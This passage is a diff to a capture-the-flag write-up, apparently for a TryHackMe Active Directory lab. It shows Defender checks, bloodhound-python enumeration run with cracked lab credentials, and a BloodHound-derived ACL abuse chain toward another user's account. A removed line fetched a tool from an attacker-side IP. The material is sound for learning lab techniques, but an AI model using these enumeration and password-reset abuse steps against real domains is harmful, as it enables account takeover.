@@ -1001,13 +1001,93 @@ Then we can proceed to try to reverse the hashes (note that her I run hashcat on
     Recovered........: 1/3 (33.33%) Digests (total), 1/3 (33.33%) Digests (new), 1/3 (33.33%) Salts
 
 We were able to get the password for the user <b>TABATHA_BRITT@THM.CORP:</b>. With this account I tried to RDP into the server. We can signin as a temporary profiles, it means that every saved file will be lost on log-out. 
+Let's inspect our privileges:
 
-    C:\Users\TEMP.THM>curl -O http://10.9.1.153:8000/PingCastle_3.2.0.1.zip
+    whoami /priv
+    net user tabatha_britt /domain
+    
+No useful information emerged. Check if Defender is running:
 
-    Import-Module ActiveDirectory
+    PS C:\Users\TEMP.THM> Get-MpComputerStatus
+    AMEngineVersion                  : 1.1.23110.2
+    AMProductVersion                 : 4.18.23110.3
+    AMRunningMode                    : Normal
+    AMServiceEnabled                 : True
+    AMServiceVersion                 : 4.18.23110.3
+    AntispywareEnabled               : True
+    AntispywareSignatureAge          : 151
+    AntispywareSignatureLastUpdated  : 1/26/2024 2:26:47 PM
+    AntispywareSignatureVersion      : 1.403.2749.0
+    AntivirusEnabled                 : True
+    AntivirusSignatureAge            : 151
+    AntivirusSignatureLastUpdated    : 1/26/2024 2:26:46 PM
+    AntivirusSignatureVersion        : 1.403.2749.0
+    BehaviorMonitorEnabled           : True
+    ....    
+
+AMSI is enabled too. I managed to run [PrivescCheck](https://github.com/itm4n/PrivescCheck) without being detected but nothing really interesting emerged. We can perform an Active directory assesment using blood-hound. In this scenario the best approach is to try a remote injection using [bloodhound.py](https://www.kali.org/tools/bloodhound.py). First I run:
+
+    bloodhound-python -dc 10.10.255.123 -d thm.corp -u 'tabatha_britt' -p 'marlboro(1985)' -c All --zip
+    WARNING: Could not find a global catalog server, assuming the primary DC has this role
+    If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
+    ERROR: The specified domain controller 10.10.255.123 looks like an IP address, but requires a hostname (FQDN).
+    Use the -ns flag to specify a DNS server IP if the hostname does not resolve on your default nameserver.
+
+So we have to correct the command as suggested:
+
+    bloodhound-python -ns 10.10.255.123 -d thm.corp -u 'tabatha_britt' -p 'marlboro(1985)' -c All --zip
+    INFO: Found AD domain: thm.corp
+    INFO: Getting TGT for user
+    WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (haystack.thm.corp:88)] [Errno -2] Name or service not known
+    INFO: Connecting to LDAP server: haystack.thm.corp
+    INFO: Found 1 domains
+    INFO: Found 1 domains in the forest
+    INFO: Found 1 computers
+    INFO: Connecting to GC LDAP server: haystack.thm.corp
+    INFO: Connecting to LDAP server: haystack.thm.corp
+    INFO: Found 42 users
+    INFO: Found 55 groups
+    INFO: Found 3 gpos
+    INFO: Found 222 ous
+    INFO: Found 19 containers
+    INFO: Found 0 trusts
+    INFO: Starting computer enumeration with 10 workers
+    INFO: Querying computer: HayStack.thm.corp
+    INFO: Done in 00M 43S
+    INFO: Compressing output into 20240626163201_bloodhound.zip
+
+
+Now we can feed bloodhound with the generated file. To start bloodhound on kali follows the [official installation page](https://www.kali.org/tools/bloodhound/). First start neo4j:
+
+    sudo neo4j console
+    ...
+    2024-06-26 14:48:37.732+0000 INFO  Started.
+
+Then lunch the cosole:
+
+    bloodhound
+
+You can proceed to upload the file (4th button on the right bar). Once the file is uploaded you can use the Analysis tab to perform some queries: 
+
+    Analysis --> Kerberos Interaction --> Find AS-REP Roastable Users (DontReqPreAuth)
+    
+In the graph panel select tabatha_britt (the user we control), then we can run some other analysis on this object. An interesting one is:
+
+    Node Info --> OUTBOUND OBJECT CONTROL --> Transitive Object Control
+
+Click the arrow icon to run the query. In the resulting graph you can notice that there is an interesting path that can lead us to control darla_winters account:
+
+    [tabatha_britt] --(GenricAll) --> [shawna_bray] -- (ForceChangePassword) --> [cruz_hall] -- (GenericWrite) --> [darla_winters]
+
+We can abuse these delegations since:
+- GenericAll: full rights to the object, including reset user's password
+- ForceChangePassword: we can change the user password
+- GenericWrite: combination of write permissions, including WriteProperty. Again that implies we can change the user password
+
+
     
 
-
+    
 
 
     
